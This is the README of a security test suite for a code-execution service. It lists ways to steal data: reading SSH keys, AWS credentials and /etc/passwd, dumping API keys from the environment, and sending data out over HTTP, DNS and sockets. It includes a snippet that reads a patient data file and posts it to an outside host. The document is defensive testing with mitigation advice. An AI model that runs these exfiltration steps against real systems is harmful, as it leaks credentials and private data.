# Data Exfiltration Security Test Suite

This directory contains comprehensive security tests for `CustomCodeExecutionService`, focusing on **data exfiltration vulnerabilities**.

## Test Categories

| File | Category | Tests | Impact |
|------|----------|-------|--------|
| `test_network_exfiltration.py` | Network-based data theft | 10 | CRITICAL |
| `test_filesystem_exfiltration.py` | File system access | 11 | CRITICAL |
| `test_environment_leakage.py` | Environment variables | 10 | CRITICAL |

**Total:** 31 attack vectors tested

---

## Quick Start

### Run All Tests
```bash
pytest tests/manual/custom_code_execution/01_data_exfiltration/ -v
```

### Run Specific Category
```bash
# Network exfiltration only
pytest tests/manual/custom_code_execution/01_data_exfiltration/test_network_exfiltration.py -v

# Filesystem exfiltration only
pytest tests/manual/custom_code_execution/01_data_exfiltration/test_filesystem_exfiltration.py -v

# Environment leakage only
pytest tests/manual/custom_code_execution/01_data_exfiltration/test_environment_leakage.py -v
```

### Run with Output
```bash
# Show print statements (vulnerability details)
pytest tests/manual/custom_code_execution/01_data_exfiltration/ -v -s
```

---

## Expected Results

### All Tests Should PASS

These tests verify that vulnerabilities **exist** (not that they're blocked). Each test:
- **PASSES** = Vulnerability confirmed (attack succeeds)
- **SKIPS** = Test not applicable (e.g., Linux-only test on macOS)
- **FAILS** = Unexpected protection (vulnerability was blocked)

Example output:
```
test_http_request_urllib_EXPECT_SUCCESS PASSED
⚠️  CRITICAL VULNERABILITY: Network access allowed via urllib
```

---

## Test Naming Convention

- `test_*_EXPECT_SUCCESS` - Attack should succeed (vulnerability exists)
- `test_*_EXPECT_BLOCKED` - Attack should be blocked (protection exists)

Currently, **all tests expect SUCCESS** because no protections are implemented.

---

## Detailed Findings

See **[DATA_EXFILTRATION_REPORT.md](DATA_EXFILTRATION_REPORT.md)** for:
- Executive summary
- Detailed vulnerability descriptions
- Proof-of-concept exploits
- Impact assessments
- Mitigation recommendations
- Production deployment guidance

---

## Key Vulnerabilities

### Network Exfiltration (10 vectors)
1. HTTP/HTTPS requests (urllib, http.client)
2. Raw TCP/UDP sockets
3. DNS queries (covert channel)
4. FTP, SMTP protocols
5. URL encoding steganography
6. Timing side-channels

### Filesystem Access (11 vectors)
1. Read system files (`/etc/passwd`, `/etc/hosts`)
2. Steal SSH private keys (`~/.ssh/id_rsa`)
3. Steal AWS credentials (`~/.aws/credentials`)
4. Path traversal (`../../../`)
5. Absolute path access
6. Symbolic link following
7. Write to system directories (`/tmp`, home)

### Environment Leakage (10 vectors)
1. Dump all environment variables
2. Steal API keys (ANTHROPIC_API_KEY, AWS_*, GITHUB_TOKEN)
3. Steal database URLs
4. System path reconnaissance
5. Parent process environment access
6. Pattern-based credential search

---

## Example: Network Exfiltration

```python
# This code WILL succeed (vulnerability)
code = '''
import urllib.request
import json

# Read sensitive data
with open('patient_data.csv') as f:
    data = f.read()

# Exfiltrate to external server
request = urllib.request.Request(
    'http://httpbin.org/post',
    data=json.dumps({'stolen': data}).encode(),
    headers={'Content-Type': 'application/json'}
)
response = urllib.request.urlopen(request, timeout=5)
result = f"Data exfiltrated, status={response.code}"
'''

service = CustomCodeExecutionService(data_manager)
result, stats, ir = service.execute(code, persist=False)
# Returns: "Data exfiltrated, status=200"
```

---

## Security Recommendations

### P0 - Critical (Immediate)
1. **Document security risks** in tool docstring
2. **Create user security guide**
3. **Implement environment variable sanitization**
4. **Add Docker isolation instructions**

### P1 - High (Before Production)
1. **Implement network isolation** (Docker `--network=none`)
2. **Add filesystem restrictions** (chroot or read-only mounts)
3. **Add audit logging** for file operations

### P2 - Medium (Defense in Depth)
1. **Resource limits** (ulimit, cgroups)
2. **Expand import restrictions**
3. **Anomaly detection**

See full recommendations in **DATA_EXFILTRATION_REPORT.md**.

---

## For Developers

### Adding New Tests

1. Follow naming convention: `test_<attack>_EXPECT_<SUCCESS|BLOCKED>`
2. Include docstring with:
   - Attack vector description
   - Expected result
   - Impact level
3. Use proof-of-concept code in test
4. Print clear vulnerability status
5. Update report with findings

### Test Structure

```python
def test_new_attack_EXPECT_SUCCESS(self, service):
    """
    Test: Brief description
    Expected: SUCCESS (vulnerability exists)
    Impact: CRITICAL/HIGH/MEDIUM
    """
    code = '''
# Proof of concept code
result = "VULNERABILITY: ..." if success else "PROTECTED: ..."
'''

    result, stats, ir = service.execute(code, persist=False)

    print(f"\\n[Test Name] Result: {result}")

    if "VULNERABILITY" in str(result):
        print("⚠️  IMPACT: Description")
        assert "VULNERABILITY" in str(result)
    else:
        print("✅ PROTECTED: Description")
        assert "PROTECTED" in str(result)
```

---

## Contact

For security issues: security@omics-os.com

For test questions: See agent instructions in CLAUDE.md

---

**Test Suite Version:** 1.0
**Last Updated:** 2025-11-30
**Agent:** Agent 1 - Data Exfiltration Tester
